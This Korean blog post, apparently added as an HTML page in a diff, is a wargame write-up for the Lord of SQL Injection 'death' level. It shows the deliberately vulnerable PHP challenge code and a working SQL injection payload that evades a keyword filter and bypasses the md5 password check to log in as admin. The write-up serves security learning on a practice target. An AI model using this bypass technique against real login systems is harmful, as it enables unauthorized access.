@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html class="no-js">
+  <head>
+	<meta charset="utf-8">
+	<title>[Lord of SQL Injection] LoS - death 문제풀이 | mingzzi</title>
+	<meta name="description" content="두 번째 문제는 death이다.이 전 문제와 비슷해서 쉽게 풀 수 있었다.">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- CSS -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+
+	<!--Favicon-->
+	<link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">
+
+	<!-- Canonical -->
+	<link rel="canonical" href="/wargame/lord%20of%20sql%20injection/2019/06/13/los-death.html">
+
+	<!-- RSS -->
+	<link rel="alternate" type="application/atom+xml" title="mingzzi" href="/feed.xml" />
+
+	<!-- Font Awesome -->
+	<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+	<!-- Google Fonts -->
+	
+	<link href="https://fonts.googleapis.com/css?family=Nanum+Gothic:400,700" rel="stylesheet">
+	
+
+	<!-- KaTeX -->
+	
+	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.css">
+	<script src="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.js"></script>
+	
+
+	<!-- Google Analytics -->
+	
+	<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+	ga('create', 'UA-130304424-1', 'auto');
+	ga('send', 'pageview');
+	</script>
+	
+</head>
+
+  <header class="site-header">
+	<div class="branding">
+		
+		<a href="/">
+			<img class="avatar" src="/assets/img/blogmark.png" alt=""/>
+		</a>
+		
+		<h1 class="site-title">
+			<a href="/">mingzzi</a>
+		</h1>
+		<nav class="site-nav">
+				<ul>
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/about/">
+									About
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/tags.html">
+									tags
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+
+					<!-- Search bar -->
+					
+					<li>
+					<form action="/search.html" method="get">
+						<input type="text" id="search-box" name="query" placeholder="Search" class="">
+						<button type="submit" class="">
+							<i class="fa fa-fw fa-search"></i>
+						</button>
+					</form>
+					</li>
+					
+				</ul>
+		</nav>
+	</div>
+
+	<div class="site-category">
+			<ul class='cat1'>
+				<li><a href="/">Home</a></li>
+				<li><a href="/">Pentesting</a>
+					<ul>
+						<li><a href="/Pentest/iOS">iOS</a></li>
+						<li><a href="/Pentest/Android">Android</a></li>
+						<li><a href="/Pentest/PWeb">Web</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Wargame</a>
+					<ul>
+						<li><a href="/Wargame/LoS">Load of SQL Injection</a></li>
+						<li><a href="/Wargame/Pwnkr">Pwnable.kr</a></li>
+						<li><a href="/Wargame/Warkr">Wargame.kr</a></li>
+						<li><a href="/Wargame/XG">XSS Game</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">CTF</a>
+					<ul>
+						<li><a href="/CTF/2018">2018</a></li>
+						<li><a href="/CTF/2019">2019</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Error</a>
+					<ul>
+						<li><a href="/Error/Linux">Linux</a></li>
+						<li><a href="/Error/Python">Python</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Development</a>
+					<ul>
+						<li><a href="/Develop/Database">Database</a></li>
+						<li><a href="/Develop/Blog">Github Blog</a></li>
+						<li><a href="/Develop/DWeb">Web</a></li>
+						<li><a href="/Develop/Docker">Docker</a></li>
+						<li><a href="/Develop/Basic">Basic</a></li>
+					</ul>
+				</li>
+			</ul>
+		</div>
+
+</header>
+
+  <body>
+    <div class="content">
+      <article >
+  <header style="background-image: url('/')">
+    <h1 class="title">[Lord of SQL Injection] LoS - death 문제풀이</h1>
+    
+    <p class="meta">
+      June 13, 2019
+      
+    </p>
+  </header>
+  <section class="post-content"><p>두 번째 문제는 <code class="highlighter-rouge">death</code>이다.</p>
+
+<p>이 전 문제와 비슷해서 쉽게 풀 수 있었다.</p>
+
+<!--more-->
+
+<p>코드는 다음과 같다.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----------------------------------------------------------------
+query : select id from prob_death where id='' and pw=md5('')
+-----------------------------------------------------------------
+
+<span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span> 
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nv">$db</span> <span class="o">=</span> <span class="nx">dbconnect</span><span class="p">();</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\.|\(\)|admin/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span> 
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\.|\(\)|admin/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span> 
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select id from prob_death where id='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">]</span><span class="si">}</span><span class="s2">' and pw=md5('</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">')"</span><span class="p">;</span> 
+  <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span><span class="p">;</span> 
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span><span class="nv">$query</span><span class="p">));</span> 
+  <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'admin'</span><span class="p">)</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"death"</span><span class="p">);</span>
+  <span class="k">elseif</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="k">echo</span> <span class="s2">"&lt;h2&gt;Hello </span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;br&gt;You are not admin :(&lt;/h2&gt;"</span><span class="p">;</span> 
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span> 
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>이 전 문제와 동일하게 방화벽이 걸려 있으며, 다른점은 <code class="highlighter-rouge">pw</code>가 <code class="highlighter-rouge">md5</code>로 해싱된다는 것과 추출한 결과의 <code class="highlighter-rouge">id</code> 값이 <code class="highlighter-rouge">admin</code>이어야 한다는 것이다.</p>
+
+<p>언뜻 보기에는 <code class="highlighter-rouge">admin</code>의 정확한 <code class="highlighter-rouge">pw</code> 값을 알아야 할 것 같다.</p>
+
+<p>하지만 어찌어찌 방화벽을 우회해서 DB에 저장된 pw 값을 뽑아낸다 하더라도 그 값은 <code class="highlighter-rouge">md5</code>로 해싱 된 값이기 때문에 <code class="highlighter-rouge">pw</code>를 복구하기가 어렵다.</p>
+
+<p>때문에 뒤의 <code class="highlighter-rouge">pw</code>를 검사하는 부분을 무시하도록 혹은 검증하지 않도록 공격을 수행해야 한다.</p>
+
+<p>이를 위해 내가 생각한 쿼리는 다음과 같다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id=-1'&lt;@=1 OR id&lt;'guest' OR '&amp;pw=a
+</code></pre></div></div>
+
+<p>이를 입력하면 완성되는 쿼리는 다음과 같다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select id from prob_death where id='-1'&lt;@=1 OR id&lt;'guest' OR '' and pw=md5('a')
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">where 절</code>을 살펴보면 조건은 크게 3개이다.</p>
+
+<p>첫 번째로 <code class="highlighter-rouge">id='-1'&lt;@1</code>은 이 전 문제에서 설명했다시피 <code class="highlighter-rouge">'-1'&lt;@1</code>이 <code class="highlighter-rouge">NULL</code>이 되며 <code class="highlighter-rouge">id=NULL</code>이 되기 때문에 <code class="highlighter-rouge">거짓</code>이 된다.</p>
+
+<p>이 때, 두 번째 조건은 <code class="highlighter-rouge">id&lt;'guest'</code>이다.  <code class="highlighter-rouge">id</code>의 값이 <code class="highlighter-rouge">guest</code> 보다 작은 값을 찾게 되는데, 이는 테이블에 값이 <code class="highlighter-rouge">admin</code>과 <code class="highlighter-rouge">guest</code>만 있다고 가정하고 사용 한 조건이다.</p>
+
+<p>알파벳 <code class="highlighter-rouge">a</code>는 <code class="highlighter-rouge">g</code>보다 값이 작기 때문에 <code class="highlighter-rouge">admin</code>의 값은 <code class="highlighter-rouge">guest</code>보다 작다.</p>
+
+<p>만약 테이블에 <code class="highlighter-rouge">admin</code>과 <code class="highlighter-rouge">guest</code>의 두 값만 있다면, <code class="highlighter-rouge">id&lt;'guest'</code>의 결과는 당연히 <code class="highlighter-rouge">admin</code>이 될 것이다.</p>
+
+<p>여기서 두 번째 조건이 참이 되었기 때문에 뒤의 <code class="highlighter-rouge">'' and pw=md5('a')</code>는 무시하게 된다.</p>
+
+<p>해당 쿼리를 문제에 전달하면 아래와 같이 <code class="highlighter-rouge">admin</code> 값을 추출하며 문제를 풀 수 있다.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-------------------------------------------------------------------------------------------
+query : select id from prob_death where id='-1'<span class="nt">&lt;</span><span class="err">@=</span><span class="na">1</span> <span class="na">OR</span> <span class="na">id</span><span class="err">&lt;'</span><span class="na">guest</span><span class="err">'</span> <span class="na">OR</span> <span class="err">''</span> <span class="na">and</span> <span class="na">pw=</span><span class="s">md5('a')</span>
+<span class="na">-------------------------------------------------------------------------------------------</span>
+
+<span class="na">DEATH</span> <span class="na">Clear</span><span class="err">!</span>
+<span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span> 
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nv">$db</span> <span class="o">=</span> <span class="nx">dbconnect</span><span class="p">();</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\.|\(\)|admin/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span> 
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\.|\(\)|admin/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span> 
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select id from prob_death where id='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">id</span><span class="p">]</span><span class="si">}</span><span class="s2">' and pw=md5('</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">')"</span><span class="p">;</span> 
+  <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span><span class="p">;</span> 
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span><span class="nv">$query</span><span class="p">));</span> 
+  <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'admin'</span><span class="p">)</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"death"</span><span class="p">);</span>
+  <span class="k">elseif</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="k">echo</span> <span class="s2">"&lt;h2&gt;Hello </span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;br&gt;You are not admin :(&lt;/h2&gt;"</span><span class="p">;</span> 
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span> 
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">DEATH Clear!</code></p>
+</section>
+  
+<footer>
+  <div class="tags">
+    
+    <a class="tag" href="/tags#Write-up">#Write-up</a>
+    
+    <a class="tag" href="/tags#Lord of SQL Injection">#Lord of SQL Injection</a>
+    
+  </div>
+</footer>
+
+
+</article>
+<!-- Disqus -->
+<a href="https://devYurim.github.io/wargame/lord%20of%20sql%20injection/2019/06/13/los-death.html#disqus_thread"></a>
+
+<div class="comments">
+  
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://https-devyurim-github-io-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+</div>
+
+
+<!-- Post navigation -->
+
+  <div id="post-nav">
+  
+  <div id="previous-post" class="post-nav-post">
+      <p>Previous post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2019/06/12/los-cthulhu.html">
+        [Lord of SQL Injection] LoS - cthulhu 문제풀이
+      </a>
+  </div>
+  
+  
+  <div id="next-post" class="post-nav-post">
+      <p>Next post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2019/06/14/los-godzilla.html">
+        [Lord of SQL Injection] LoS - godzilla 문제풀이
+      </a>
+  </div>
+  
+</div>
+
+
+
+    </div>
+    
+<script src="/assets/js/katex_init.js"></script>
+
+
+
+<footer class="site-footer">
+	<p class="text">Powered by <a href="https://jekyllrb.com/">Jekyll</a> with <a href="https://github.com/rohanchandra/type-theme">Type Theme</a>
+</p>
+</footer>
+
+
+    <script id="dsq-count-scr" src="//.disqus.com/count.js" async></script>
+
+    <!-- Google Analytics Tracking code -->
+<script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', '']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+</script>
+
+  </body>
+</html>
